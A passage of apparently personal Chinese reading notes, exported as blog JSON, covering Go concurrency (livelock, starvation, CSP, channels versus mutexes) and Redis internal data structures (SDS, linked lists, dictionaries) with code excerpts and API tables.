walking.Done()\t\tfmt.Fprintf(&amp;out, &quot;%v is trying to scoot:&quot;, name)\t\tfor i := 0; i &lt; 5; i++ &#123;\t\t\tif tryLeft(&amp;out) || tryRight(&amp;out) &#123;\t\t\t\treturn\t\t\t&#125;\t\t&#125;\t\tfmt.Fprintf(&amp;out, &quot;\\n%v tosses her hands up in exasperation!&quot;, name)\t&#125;\tvar peopleInHallway sync.WaitGroup\tpeopleInHallway.Add(2)\tgo walk(&amp;peopleInHallway, &quot;Alice&quot;)\tgo walk(&amp;peopleInHallway, &quot;Barbara&quot;)\tpeopleInHallway.Wait()&#125;\n\n输出如下：\nAlice is trying to scoot: left right left right left right left right left rightAlice tosses her hands up in exasperation!Barbara is trying to scoot: left right left right left right left right left rightBarbara tosses her hands up in exasperation!\n\n你可以看到，Alice和Barbara在最终退出之前，会持续竞争。\n\ntryDir 函数允许一个人尝试向一个方向移动，并返回是否成功。dir 表示试图朝这个方向移动的人数。\n首先，宣布尝试向这个方向移动，atomic 使 dir 原子操作加一。\ntakeStep 函数调用 cadence.Wait 来等待其他并发进程，用以同步每个协程的节奏。因为要演示活锁，每个人都必须以相同的速度或节奏移动。\n当意识到不能向这个方向走时，便放弃。将 dir 减一。\nwalk 函数中，人为限制了尝试的次数，否则，它将会一直无意义执行下去。\nwalk 中，会尝试向左走，如果失败，则尝试向右走。\n\n这个例子演示了使用活锁的一个十分常见的原因：两个或两个以上的并发进程试图在没有协调的情况下防止死锁。这就好比，如果走廊里的人都同意，只有一个人会移动，那就不会有活锁；一个人会站着不动，另一个人会移到另一边，他们就会继续移动。在我看来，活锁要比死锁更复杂，因为它看起来程序好像在工作。如果一个活锁程序在你的机器上运行，那你可以通过查看CPU利用率来确定它是否在做处理某些逻辑，你可能会认为它确实是在工作。根据活锁的不同，它甚至可能发出其他信号，让你认为它在工作。然而，你的程序将会一直上演“hallway-shuffle’”的循环游戏。\n活锁是一组被称为“饥饿”的更大问题的子集。\n饥饿饥饿是在任何情况下，并发进程都无法获得执行工作所需的所有资源。\n当我们讨论活锁时，每个goroutine的资源是一个共享锁。\n活锁保证讨论与饥饿是无关的，因为在活锁中，所有并发进程都是相同的，并且没有完成工作。更广泛地说，饥饿通常意味着有一个或多个贪婪的并发进程，它们不公平地阻止一个或多个并发进程，以尽可能有效地完成工作，或者阻止全部并发进程。\n下面的例子有一个贪婪的 goroutine 和一个平和的 goroutine：\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tvar wg sync.WaitGroup\tvar sharedLock sync.Mutex\tconst runtime = 1 * time.Second\tgreedyWorker := func() &#123;\t\tdefer wg.Done()\t\tvar count int\t\tfor begin := time.Now(); time.Since(begin) &lt;= runtime; &#123;\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(3 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tcount++\t\t&#125;\t\tfmt.Printf(&quot;Greedy worker was able to execute %v work loops.\\n&quot;, count)\t&#125;\tpoliteWorker := func() &#123;\t\tdefer wg.Done()\t\tvar count int\t\tfor begin := time.Now(); time.Since(begin) &lt; runtime; &#123;\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(1 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(1 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tsharedLock.Lock()\t\t\ttime.Sleep(1 * time.Nanosecond)\t\t\tsharedLock.Unlock()\t\t\tcount++\t\t&#125;\t\tfmt.Printf(&quot;Polite worker was able to execute %v work loops.\\n&quot;, count)\t&#125;\twg.Add(2)\tgo greedyWorker()\tgo politeWorker()\twg.Wait()&#125;\n\n输出如下：\nGreedy worker was able to execute 33 work loops.Polite worker was able to execute 12 work loops.\n\n贪婪的 worker 会贪婪地抢占共享锁，以完成整个工作循环，而平和的 worker 只会在必要时锁定。两种 worker 都做到同样的工作（sleep 3 ns），但贪婪的 worker 工作量会比平和的 worker 多得多。\n通过记录和采样确定进程工作速度是否符合预期，可以发现和解决饥饿。所以，饥饿会导致你的程序表现不佳或不正确。前面的示例演示了低效场景，但是如果你有一个非常贪婪的并发进程，以至于完全阻止另一个并发进程完成工作，那么你就会遇到一个更大的问题。我们还应该考虑到来自于外部过程的饥饿。请记住，饥饿也可以应用于CPU、内存、文件句柄、数据库连接：任何必须共享的资源都是饥饿的候选者。\n第二章 - 对你的代码建：通信顺序进程并发与并行的区别\n并发属于代码，并行属于一个运行中的程序。\n\n这个区别其实仔细体会一下，描述得很清楚。比如，我写了一个两部分可以并行运行的程序，但我却在一个只有一个核心的机器上运行它。那么同一时刻只会有一个部分被执行，他不可能是并行的。但如果是多个核心的机器，那么两个部分就可以并行执行。但这两台机器上我们都可以认为它是并发的，因为并发是一段时间内两个部分都被执行就认为是并发的。（当然，这句是我以前的观点。学习操作系统进程相关知识时的观点）\n但这章中的观点是：并行是一个时间或者上下文的函数。上一章中，上下文被定义为一个操作被认为是原子性的界限。这里，上下文定义为两个或以上的操作被认为是并行的界限。\n比如，我们的上下文是一段5s的时长，执行了两个分别消耗1s的操作，我们应该认为这些操作是并行执行的。但如果我们的上下文是1s，应该认为这些操作是分别运行的。\n对于我们来说，用不同的时间对上下文的概念进行重定义并不是一件好事，但是请记住上下文和时间并设有关系。我们可以把上下文定义成我们程序所在运行的进程，一个操作系统的线程，或者是一台机器。这很重要，因为你所定义的上下文是和并发性以及正确性密切相关。就像原子操作可以按照你所定义的上下文来定义是否为原子性，并发操作也依据你所定义的上下文来确定正确性。一切都是相关的。\n什么是 CSPCSP即“Communicating Sequential Processes’”(通信顺序进程)，既是个技术名词，也是介绍这种技术的论文的名字。在1978年，Charles Antony Richard Hoare在Association for Computing Machinery(一般被称作ACM)中发表的论文。在这篇论文里，Hoar认为输入与输出是两个被忽略的编程原语，尤其是在并发代码中。在Hoare写作这篇论文的同时，关于如何架构程序的相关研究还在进行中，但是大部分的研究都是针对编写顺序代码的方法：goto语句的使用正在被讨论，面向对象范型正在成为编程的基石。并发操作并没有被给予过多的思考。Hoare开始纠正这个现象，所以，关于CSP的这篇论文就横空出世了。在1978年的论文中，CSP仅是一个完全用来展示通信顺序进程的能力的一个简单的编程语言。事实上，他甚至在论文中写道：因此，本文介绍的概念和符号应该...不被认为适合作为一种编程语言，无论是抽象的还是具体的编程。\n而且正是因为CSP的原始论文以及从论文中进化而来的原语正是Go语言并发模型的主要灵感，而这正是我们接下来所要聚焦的。\n用来支撑他关于输入与输出需要被按照语言的原语来考虑，Hoare的CSP编程语言包含用来建模输入与输出，或者说“在进程间正确通信”（这就是论文名字的由来)的原语。为了在进程之间进行通信，Hoar心创造了输入与输出的命令：！代表发送输入到一个进程，？代表读取一个进程的输出。每一个指令都需要指定具体是一个输出变量（从一个进程中读取一个变量的情况），还是一个目的地（将输入发送到一个进程的情况)。有时，这两种方法会引用相同的东西，在这种情况下，这两个过程会被认为是相对应的。换言之，一个进程的输出应该直接流向另一个进程的输入。\n这种语言同时利用了一个所谓的守护命令，也就是Edgar Dijkstra在一篇之前在I974年所写的论文中介绍的，“Guarded commands,nondeterminacy and formal derivation of programs’”。一个有守护的命令仅仅是一个带有左和右倾向的语句，由一来分割。左侧服务是有运行条件的，或者是守护右侧服务，如果左侧服务运行失败，或者在一个命令执行后，返回false或者退出，右侧服务永远不会被执行。将这些与Hoare的I&#x2F;O命令组合起来，为Hoare的通信过程奠定了基础，从而实现了channel。\n经验判断Hoare的建议是正确的，然而，有趣的是，在Go语言发布之前，很少有语言能够真正地为这些原语提供支持。大多数流行的语言都支持共享和内存访问同步到CSP的消息传递样式。 当然也有例外，但不幸的是，这些都局限于没有广泛采用的语言。Go语言是最早将CSP的原则纳人共核心的语言之一，并将这种并发编程风格引入到大众中。它的成功也使得其他语言尝试添加这些原语。内存访问同步并不是天生就不好。在Go语言中，甚至有时共享内存在某些情况下是合适的。但是，共享内存模型很难正确地使用，特别是在大型或复杂的程序中。正是由于这个原因，并发被认为是Go语言的优势之一，它从一开始就建立在CSP的原则之上，因此很容易阅读、编写和推理。\nGo语言的并发哲学CSP一直都是Go语言设计的重要组成部分。然而，Go语言还支持通过内存访问同步和遵循该技术的原语来编写并发代码的传统方式。sync与其他包中的结构体与方法可以让你执行锁，创建资源池取代goroutine等。\n能够在CSP原语和内存访问同步之间选择对于你来说很棒，因为它让你去编写解决问题的并发代码上有了更多选择，但这可能显得有些莫名其妙。Go语言的初学者总是认为CSP样式编写并发代码是Go语言编写并发代码的唯一方式。比如说，在sync包的文档中，有如下描述：\n\nsync包提供了基本的同步基元，如互斥锁。除了Once类型和WaitGroup类型，大部分都是适用低水平程序线程，高水平的同步使用channel通信更好一些。\n\n在Go语言的FAQ中，有如下陈述：\n\n为了尊重mutex,sync包实现了mutex,但是我们希望Go语言的编程风格将会鼓励人们尝试更高等级的技巧。尤其是考虑构建你的程序，以便一次只有一个goroutine负责某个特定的数据。不要通过共享内存进行通信。相反，通过通信来共享内存。有数不清的关于Go语言核心图队的文章、讲座和访谈，相对于使用像sync.Mutex这样的原语，他们更加拥护CSP。\n\n因此，Go语言团队为什么选择公开内存访问同步原语会感到困惑是完全可以理解的。更令人因惑的是，你通常会在外面看到出现的同步原语。见到人们抱怨过度使用channel,也会听到一些Go语言团队成员说使用它们是“OK”的。Go语言的维基上有一个关于此的引用：\n\nGo语言的一个座右铭是，“使用通信来共享内存，而不是通过共享内存来通信。”这就是说，Go语言确实在syc包中提供了传统的锁机制。大多数的锁问题都可以通过channel或者传统的锁两者之一来解决。所以说，我该用哪个？使用最好描述和最简单的那个方式。\n\n这是很好的建议，也是你在使用Go语言时经常看到的谁则，但它有点含糊。我们如何理解什么更具表现力、更简单？我们应该使用什么标准？幸运的是，我们可以使用一些标准来帮助我们做正确的事情。正如我们将看到的那样，我们主要的区分方式来自于试图管理并发的地方：主观地想象一个狭窄的范围，或者在我们的系统外部。\n\n让我们逐步来介绍这些决策：\n你想要转让数据的所有权么？如果你有一块产生计算结果并想共享这个结果给其他代码块的代码，你所实际做的事情是传递了数据的所有权。如果你对内存所有制且不支持GC的语言很熟悉的话，对于这个概念你应该是很熟悉的：数据拥有所有者，并发程序安全就是保证同时只有一个并发上下文拥有数据的所有权。channel通过将这个意图编写进channel类型本身来帮助我们表达这个意图。\n这么做的一个很大的好处就是可以创建一个带缓存的channel来实现一个低成本的在内存中的队列来解耦你的生产者与消费者。另一个好处就是通过使用channel确保你的并发代码可以和其他的并发代码进行组合。\n你是否试图在保护某个结构的内部状态？这时候内存访问同步原语的一个很好的选择，也是一个你不应该使用channel的很好的示例。通过使用内存访问同步原语，可以为你的调用者隐藏关于重要代码块的实现细节。这是一个线程安全类型的小例子，且不会给调用者带来复杂性：\npackage mainimport &quot;sync&quot;type Counter struct\tmu    sync.Mutex\tvalue int&#125;func (c *Counter) Increment() &#123;\tc.mu.Lock()\tdefer c.mu.Unlock()\tc.value++&#125;\n\n如果你能回想起关于原子性的细节，可以说我们在这里所做的就是定义了Counter类型的原子性范围。调用增量可被认为是原子的。记住这里的关键词是“内部的”。如果你发现自己正在将锁暴露在一个类型之外，这时侯你应该注意了。试着将你的锁放在一个小的字典范围内。\n你是否试图协调多个逻辑片段？请记住，channel本质上比内存访问同步原语更具可组合性。将锁分散在整个对象图中听起来像是一场噩梦，但是，将channel编写的随处可见是被鼓励以及期待的！我可以组合channel,但是我不能轻易的组合锁或者有返回值的方法。\n你会发现，因为Go语言的select语句，以及channel可以当作队列使用和被安全的随意传递。所以，当在使用channel的时候，你可以更简单的控制你软件中出现的激增的复杂性。如果你发现正在挣扎着理解你的并发代码是如何工作的，为什么会出现死锁以及竞争，而你正在只用原语，这是一个你应该切换到channel的好示例。\n这是一个对性能要求很高的临界区吗？这绝对不意味着“我想让我的程序拥有高性能，因此，我应该只是用mutex’”。当然，如果你程序中的某部分，事实证明是一个主要的性能瓶颈，比程序的其他部分慢几个数量级，使用内存访问同步原语可能会帮助这个重要的部分在负载下执行。这是因为channel使用内存访问同步来操作，因此它们只能更慢。然而，在我们考虑这一点之前，性能至关重要的程序部分可能暗示着需要重新规划我们的程序。\n希望这可以清楚地说明是否利用CSP风格的并发或内存访问同步。还有其他一些模式和做法在使用操作系统线程作为并发抽象方式的语言中很有用。在使用操作系统线程作为主要并发抽象的语言中还有其他的方式以及实践。比如说，像是线程池之类的东西经常出现。因为这些抽象大多数都是为了利用操作系统线程的优点与缺点。Go语言的并发性哲学可以这样总结：追求简洁，尽量使用channel,并且认为goroutine的使用是没有成本的。\n","categories":["读书笔记"],"tags":["go","并发","《go语言并发之道》"]},{"title":"《Redis设计与实现》读书笔记-数据结构与对象","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8ARedis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AF%B9%E8%B1%A1/","content":"前言有点遗憾，梁敬彬和梁敬弘老师关于数据库的第二本佳作《收获，不止SQl优化》短期内可能不会去看了。正如老师在《收获，不止Oracle》第一章中所写，数据库是个庞大的体系，应该根据自己的需求去学习。目前看来，时机未到。我需要更多的积累之后，再去阅读关于SQL优化的书。毕竟没有足够的使用经验，很难达到“哦，原来可以这么优化”的顿悟的感觉。所以暂且搁置。开始 Redis 的学习，知识的广度也很重要。\n《Redis设计与实现》第一部分：数据结构与对象包含第2-8章。第一章是引言，介绍书的大概结构和阅读顺序，这里省略。\n第二章 - 简单动态字符串Redis 没有直接使用 C 语言传统的字符串（以空字符结尾的字符数组），而是自己实现了一种新的字符串类型，叫做简单动态字符串，简称SDS（Simple Dynamic String）。并使用 SDS 来作为 Redis 的默认字符串表示。Redis 中在一些无需对字符串进行修改的地方会使用C字符串作为字符串字面量（string literal），比如打印日志等。而在需要修改字符串时，会使用 SDS 表示字符串值。比如：\nset msg &quot;hello world&quot;\n\nRedis 会在数据库中创建一个键值对，键是一个 SDS 对象，保存着字符串 “msg”，值也是一个 SDS 对象，保存着字符串 “hello world”。\n除了用来保存数据库中的字符串值之外，SDS 还被用作缓冲区(buffer):AOF 模块中的 AOF 缓冲区，以及客户端状态中的输入缓冲区，都是由SDS 实现的。\nSDS 的定义每个sds.h&#x2F;sdshdr结构表示一个SDS值：\nstruct sdshdr &#123;    // 记录 buf 数组中已使用字节的数量    // 等于 SDS 所保存字符串的长度    int len;    // 记录 buf 数组中未使用字节的数量    int free;    // 字节数组，用于保存字符串    char buf[];&#125;;\n\n\n上面是一个 SDS 的示例，其中\n\nfree 属性为 0，表示 SDS 没有分配任何未使用空间\nlen 属性为 5，表示 SDS 保存了一个 5 字节长的字符串\nbuf 属性是一个字节数组，数组中保存着字符串 “hello” 的五个字节和最后一个空字符 ‘\\0’\n\nSDS 遵循 C 字符串以空字符结尾的惯例，保存空字符的 1 字节空间不计算在 SDS 的 len 属性里面。并且为空字符分配额外的 1 字节空间，以及添加空字符到字符串末尾等操作，都是由 SDS 函数自动完成的，所以这个空字符对于 SDS的使用者来说是完全透明的。遵循空字符结尾这一惯例的好处是，SDS 可以直接重用一部分 C 字符串函数库里面的函数。而无需为 SDS 做任何额外的工作。\n下面这个 SDS 和之前展示的 SDS 的区别在于，这个 SDS 为 buf 数组分配了五字节未使用空间，所以它的 free 属性的值为 5\n\n后面介绍 free 空间在 SDS 中的作用。\nSDS 与 C 字符串的区别根据传统，C 语言使用长度为 N+1 的字符数组来表示长度为 N 的字符串，并且字符数组的最后一个元素总是空字符’\\0’。\n常数复杂度获取字符串长度因为 C 字符串并不记录自身的长度信息，所以为了获取一个 C 字符串的长度，程序必须遍历整个字符串，对遇到的每个字符进行计数，直到遇到代表字符串结尾的空字符为止，这个操作的复杂度为O（N）。和 C 字符串不同，因为 SDS 在 len 属性中记录了 SDS 本身的长度，所以获取一个 SDS 长度的复杂度仅为O（1）。设置和更新 SDS 长度的工作是由 SDS 的 API 在执行时自动完成的，使用 SDS 无须进行任何手动修改长度的工作。\n杜绝缓冲区溢出除了获取字符串长度的复杂度高之外，C字符串不记录自身长度带来的另一个问题是容易造成缓冲区溢出（buffer overflow）。举个例子，&lt;string.h&gt;&#x2F;strcat 函数可以将 src 字符串中的内容拼接到 dest 字符串的末尾。因为 C 字符串不记录自身的长度，所以 strcat 假定用户在执行这个函数时，已经为 dest 分配了足够多的内存，可以容纳 src 字符串中的所有内容，而一旦这个假定不成立时，就会产生缓冲区溢出。\n而当 SDS API 需要对 SDS 进行修改时，API 会先检查 SDS 的空间是否满足修改所需的要求，如果不满足的话，API 会自动将 SDS 的空间扩展至执行修改所需的大小，然后才执行实际的修改操作，所以使用 SDS 既不需要手动修改 SDS 的空间大小，也不会出现前面所说的缓冲区溢出问题。\n减少修改字符串时带来的内存重分配次数因为 C 字符串并不记录自身的长度，所以对于一个包含了 N 个字符的 C 字符串来说，这个 C 字符串的底层实现总是一个 N+1 个字符长的数组（额外的一个字符空间用于保存空字符）。因为 C 字符串的长度和底层数组的长度之间存在着这种关联性，所以每次增长或者缩短一个 C 字符串，程序都总要对保存这个 C 字符串的数组进行一次内存重分配操作：\n\n如果程序执行的是增长字符串的操作，比如拼接操作（append），那么在执行这个操作之前，程序需要先通过内存重分配来扩展底层数组的空间大小——如果忘了这一步就会产生缓冲区溢出。\n如果程序执行的是缩短字符串的操作，比如截断操作（trim），那么在执行这个操作之后，程序需要通过内存重分配来释放字符串不再使用的那部分空间——如果忘了这一步就会产生内存泄漏。\n\n因为内存重分配涉及复杂的算法，并且可能需要执行系统调用，所以它通常是一个比较耗时的操作。由于 Redis 对性能的要求非常高，经常被用于数据频繁修改的场合。所以是不能接受每次修改字符串都需要进行内存重分配操作的。\nSDS 通过未使用空间解除了字符串长度和底层数组长度之间的关联：在 SDS 中，buf 数组的长度不一定就是字符数量加一，数组里面可以包含未使用的字节，而这些字节的数量就由 SDS 的 free 属性记录。通过未使用空间，SDS 实现了空间预分配和惰性空间释放两种优化策略。\n\n空间预分配空间预分配用于优化 SDS 的字符串增长操作：当 SDS 的 API 对一个 SDS 进行修改，并且需要对 SDS 进行空间扩展的时候，程序不仅会为 SDS 分配修改所必须要的空间，还会为 SDS 分配额外的未使用空间。额外分配的未使用空间数量由以下公式决定，这样可以减少连续修改字符串所需的内存重分配次数：\n如果对SDS进行修改之后，SDS的长度（也即是len属性的值）将小于1MB，那么程序分配和len属性同样大小的未使用空间，这时SDS len属性的值将和free属性的值相同。举个例子，如果进行修改之后，SDS的len将变成13字节，那么程序也会分配13字节的未使用空间，SDS的buf数组的实际长度将变成13+13+1&#x3D;27字节（额外的一字节用于保存空字符）。\n如果对SDS进行修改之后，SDS的长度将大于等于1MB，那么程序会分配1MB的未使用空间。举个例子，如果进行修改之后，SDS的len将变成30MB，那么程序会分配1MB的未使用空间，SDS的buf数组的实际长度将为30MB+1MB+1byte。\n\n\n惰性空间释放惰性空间释放用于优化SDS的字符串缩短操作：当SDS的API需要缩短SDS保存的字符串时，程序并不立即使用内存重分配来回收缩短后多出来的字节，而是使用free属性将这些字节的数量记录起来，并等待将来使用。通过惰性空间释放策略，SDS避免了缩短字符串时所需的内存重分配操作，并为将来可能有的增长操作提供了优化。SDS也提供了相应的API，可以在有需要时，真正地释放SDS的未使用空间，所以不用担心惰性空间释放策略会造成内存浪费。\n\n二进制安全C字符串中的字符必须符合某种编码（比如ASCII），并且除了字符串的末尾之外，字符串里面不能包含空字符，否则最先被程序读入的空字符将被误认为是字符串结尾，这些限制使得C字符串只能保存文本数据，而不能保存像图片、音频、视频、压缩文件这样的二进制数据。\n虽然数据库一般用于保存文本数据，但使用数据库来保存二进制数据的场景也不少见。因此，为了确保Redis可以适用于各种不同的使用场景，SDS的API都是二进制安全的（binary-safe）。所有SDS API都会以处理二进制的方式来处理SDS存放在buf数组里的数据，程序不会对其中的数据做任何限制、过滤、或者假设，数据在写入时是什么样的，它被读取时就是什么样。这也是SDS的buf属性被称为字节数组的原因——Redis不是用这个数组来保存字符，而是用它来保存一系列二进制数据。\n兼容部分C字符串函数虽然SDS的API都是二进制安全的，但它们一样遵循C字符串以空字符结尾的惯例：这些API总会将SDS保存的数据的末尾设置为空字符，并且总会在为buf数组分配空间时多分配一个字节来容纳这个空字符，这是为了让那些保存文本数据的SDS可以重用一部分&lt;string.h&gt;库定义的函数。\nSDS APISDS 主要操作 API\n\n\n\nAPI\n作用\n时间复杂度\n\n\n\nsdsnew\n创建一个包含给定 C 字符串的 SDS\nO(M)，M 为给定 C 字符串的长度\n\n\nsdsempty\n创建一个空的 SDS\nO(1)\n\n\nsdsfree\n释放给定的 SDS\nO(1)，只是释放内存\n\n\nsdslen\n返回 SDS 的已使用空间字节数\nO(1)，直接读取元数据\n\n\nsdsavail\n返回 SDS 的剩余可用空间字节数\nO(1)，直接读取元数据\n\n\nsdsdup\n创建一个给定 SDS 的副本\nO(M)，M 为给定 SDS 的长度\n\n\nsdsclear\n清空 SDS 保存的字符串内容\nO(1)，保留空间，不释放内存\n\n\nsdscat\n将给定 C 字符串拼接到 SDS 字符串的末尾\nO(M)，M 为被拼接 C 字符串的长度\n\n\nsdscatsds\n将给定 SDS 字符串拼接到另一个 SDS 字符串的末尾\nO(M)，M 为被拼接 SDS 字符串的长度\n\n\nsdscpy\n将给定的 C 字符串复制到 SDS 中，覆盖 SDS 原有的字符串\nO(N)，N 为被复制 C 字符串的长度\n\n\nsdsgrowzero\n扩展 SDS 到指定长度，如果长度变大，则在新增空间中填充零字符\nO(M)，M 为扩展新增的字节数\n\n\nsdssubstr\n保留 SDS 给定区间内的数据，不在区间内的数据会被覆盖或删除\nO(N)，N 为被保留数据的字节数\n\n\nsdstrim\n移除 SDS 中所有在给定 C 字符串中出现过的字符\nO(M)，M 为给定 C 字符串的长度\n\n\nsdscmp\n比较两个 SDS 字符串是否相同\nO(N)，N 为两个 SDS 中较短的那个的长度\n\n\nEndRedis只会使用C字符串作为字面量，在大多数情况下，Redis使用SDS（Simple Dynamic String，简单动态字符串）作为字符串表示。\n这里对字符串的包装，跟很多其他语言中的字符串类似。不过大部分语言中的字符串是不可变的。可能和 go 中数组更类似，使用 make 来创建，可以传两个整型，第一个是长度，第二个是容量。\n第三章 - 链表链表提供了高效的节点重排能力，以及顺序性的节点访问方式，并且可以通过增删节点来灵活地调整链表的长度。作为一种常用数据结构，链表内置在很多高级的编程语言里面，因为Redis使用的C语言并没有内置这种数据结构，所以Redis构建了自己的链表实现。链表在Redis中的应用非常广泛，比如列表键的底层实现之一就是链表。当一个列表键包含了数量比较多的元素，又或者列表中包含的元素都是比较长的字符串时，Redis就会使用链表作为列表键的底层实现。除了链表键之外，发布与订阅、慢查询、监视器等功能也用到了链表，Redis服务器本身还使用链表来保存多个客户端的状态信息，以及使用链表来构建客户端输出缓冲区（output buffer）\n链表和链表节点的实现每个链表节点使用一个adlist.h&#x2F;listNode结构来表示：\ntypedef struct listNode &#123;    // 前置节点    struct listNode * prev;    // 后置节点    struct listNode * next;    // 节点的值    void * value;&#125;listNode;\n\n多个listNode可以通过prev和next指针组成双端链表，如下图\n\n虽然仅仅使用多个listNode结构就可以组成链表，但使用adlist.h&#x2F;list来持有链表的话，操作起来会更方便。\ntypedef struct list &#123;    // 表头节点    listNode * head;    // 表尾节点    listNode * tail;    // 链表所包含的节点数量    unsigned long len;    // 节点值复制函数    void *(*dup)(void *ptr);    // 节点值释放函数    void (*free)(void *ptr);    // 节点值对比函数    int (*match)(void *ptr,void *key);&#125; list;\n\nlist结构为链表提供了表头指针head、表尾指针tail，以及链表长度计数器len，而dup、free和match成员则是用于实现多态链表所需的类型特定函数：\n\ndup函数用于复制链表节点所保存的值\nfree函数用于释放链表节点所保存的值\nmatch函数则用于对比链表节点所保存的值和另一个输入值是否相等\n\n\nRedis的链表实现的特性可以总结如下：\n\n双端：链表节点带有prev和next指针，获取某个节点的前置节点和后置节点的复杂度都是O（1）。\n无环：表头节点的prev指针和表尾节点的next指针都指向NULL，对链表的访问以NULL为终点。\n带表头指针和表尾指针：通过list结构的head指针和tail指针，程序获取链表的表头节点和表尾节点的复杂度为O（1）。\n带链表长度计数器：程序使用list结构的len属性来对list持有的链表节点进行计数，程序获取链表中节点数量的复杂度为O（1）。\n多态：链表节点使用void*指针来保存节点值，并且可以通过list结构的dup、free、match三个属性为节点值设置类型特定函数，所以链表可以用于保存各种不同类型的值。\n\n链表和链表节点的API\n\n\n函数\n作用\n时间复杂度\n\n\n\nlistSetDupMethod\n将给定的函数设置为链表的节点值复制函数\n复制函数可以通过链表的 dup 属性直接获得，O(1)\n\n\nlistGetDupMethod\n返回链表当前正在使用的节点值复制函数\nO(1)\n\n\nlistSetFreeMethod\n将给定的函数设置为链表的节点值释放函数\n释放函数可以通过链表的 free 属性直接获得，O(1)\n\n\nlistGetFreeMethod\n返回链表当前正在使用的节点值释放函数\nO(1)\n\n\nlistSetMatchMethod\n将给定的函数设置为链表的节点值对比函数\n对比函数可以通过链表的 match 属性直接获得，O(1)\n\n\nlistGetMatchMethod\n返回链表当前正在使用的节点值对比函数\nO(1)\n\n\nlistLength\n返回链表的长度（包含多少个节点）\n链表长度可以通过链表的 len 属性直接获得，O(1)\n\n\nlistFirst\n返回链表的表头节点\n表头节点可以通过链表的 head 属性直接获得，O(1)\n\n\nlistLast\n返回链表的表尾节点\n表尾节点可以通过链表的 tail 属性直接获得，O(1)\n\n\nlistPrevNode\n返回给定节点的前置节点\n前置节点可以通过节点的 prev 属性直接获得，O(1)\n\n\nlistNextNode\n返回给定节点的后置节点\n后置节点可以通过节点的 next 属性直接获得，O(1)\n\n\nlistNodeValue\n返回给定节点当前保存的值\n节点值可以通过节点的 value 属性直接获得，O(1)\n\n\nlistCreate\n创建一个不包含任何节点的新链表\nO(1)\n\n\nlistAddNodeHead\n将一个包含给定值的新节点添加到链表的表头\nO(1)\n\n\nlistAddNodeTail\n将一个包含给定值的新节点添加到链表的表尾\nO(1)\n\n\nlistInsertNode\n将一个包含给定值的新节点插入到指定节点的前或后\nO(1)\n\n\nlistSearchKey\n查找并返回链表中包含给定值的节点\nO(N)，N 为链表长度\n\n\nlistIndex\n返回链表中给定索引位置的节点\nO(N)，N 为链表长度\n\n\nlistDelNode\n从链表中删除给定的节点\nO(1)\n\n\nlistRotate\n将链表的表尾节点弹出，并插入到链表的表头，成为新的表头节点\nO(1)\n\n\nlistDup\n复制一个给定链表的副本\nO(N)，N 为链表长度\n\n\nlistRelease\n释放给定链表及其所有节点\nO(N)，N 为链表长度\n\n\n第四章 - 字典字典，又称为符号表（symbol table）、关联数组（associative array）或映射（map），是一种用于保存键值对（key-value pair）的抽象数据结构。在字典中，一个键（key）可以和一个值（value）进行关联（或者说将键映射为值），这些关联的键和值就称为键值对。字典中的每个键都是独一无二的，程序可以在字典中根据键查找与之关联的值，或者通过键来更新值，又或者根据键来删除整个键值对，等等。字典经常作为一种数据结构内置在很多高级编程语言里面，但Redis所使用的C语言并没有内置这种数据结构，因此Redis构建了自己的字典实现。字典在Redis中的应用相当广泛，比如Redis的数据库就是使用字典来作为底层实现的，对数据库的增、删、查、改操作也是构建在对字典的操作之上的。\n字典的实现Redis的字典使用哈希表作为底层实现，一个哈希表里面可以有多个哈希表节点，而每个哈希表节点就保存了字典中的一个键值对。\n哈希表Redis字典所使用的哈希表由dict.h&#x2F;dictht结构定义：\ntypedef struct dictht &#123;\t// 哈希表数组\tdictEntry **table;\t// 哈希表大小\tunsigned long size;\t// 哈希表大小掩码，用于计算索引值\t// 总是等于size-1\tunsigned long sizemask;\t// 该哈希表已有节点的数量\tunsigned long used;&#125; dictht;\n\ntable 属性是一个数组，数组中的每个元素都是一个指向dict.h&#x2F;dictEntry结构的指针，每个dictEntry结构保存着一个键值对。size 属性记录了哈希表的大小，也即是table数组的大小。used 属性则记录了哈希表目前已有节点（键值对）的数量。sizemask 属性的值总是等于size-1，这个属性和哈希值一起决定一个键应该被放到table数组的哪个索引上面。\n\n哈希表节点哈希表节点使用dictEntry结构表示，每个dictEntry结构都保存着一个键值对：\ntypedef struct dictEntry &#123;    // 键    void *key;    // 值    union&#123;        void *val;        uint64_tu64;        int64_ts64;    &#125; v;    // 指向下个哈希表节点，形成链表    struct dictEntry *next;&#125; dictEntry;\n\nkey 属性保存着键值对中的键。v 属性则保存着键值对中的值，其中键值对的值可以是一个指针，或者是一个uint64_t整数，又或者是一个int64_t整数。next 属性是指向另一个哈希表节点的指针，这个指针可以将多个哈希值相同的键值对连接在一次，以此来解决键冲突（collision）的问题。\n\n字典Redis中的字典由dict.h&#x2F;dict结构表示：\ntypedef struct dict &#123;    // 类型特定函数    dictType *type;    // 私有数据    void *privdata;    // 哈希表    dictht ht[2];    // rehash索引    // 当rehash不在进行时，值为-1    in trehashidx; /* rehashing not in progress if rehashidx == -1 */&#125; dict;\n\ntype属性和privdata属性是针对不同类型的键值对，为创建多态字典而设置的：\n\ntype 属性是一个指向dictType结构的指针，每个dictType结构保存了一簇用于操作特定类型键值对的函数，Redis会为用途不同的字典设置不同的类型特定函数。\nprivdata 属性保存了需要传给那些类型特定函数的可选参数。\n\nht 属性是一个包含两个项的数组，数组中的每个项都是一个dictht哈希表，一般情况下，字典只使用ht[0]哈希表，ht[1]哈希表只会在对ht[0]哈希表进行rehash时使用。rehashidx 属性记录了rehash目前的进度，如果目前没有在进行rehash，那么它的值为-1。\ntypedef struct dictType &#123;    // 计算哈希值的函数    unsigned int (*hashFunction)(const void *key);    // 复制键的函数    void *(*keyDup)(void *privdata, const void *key);   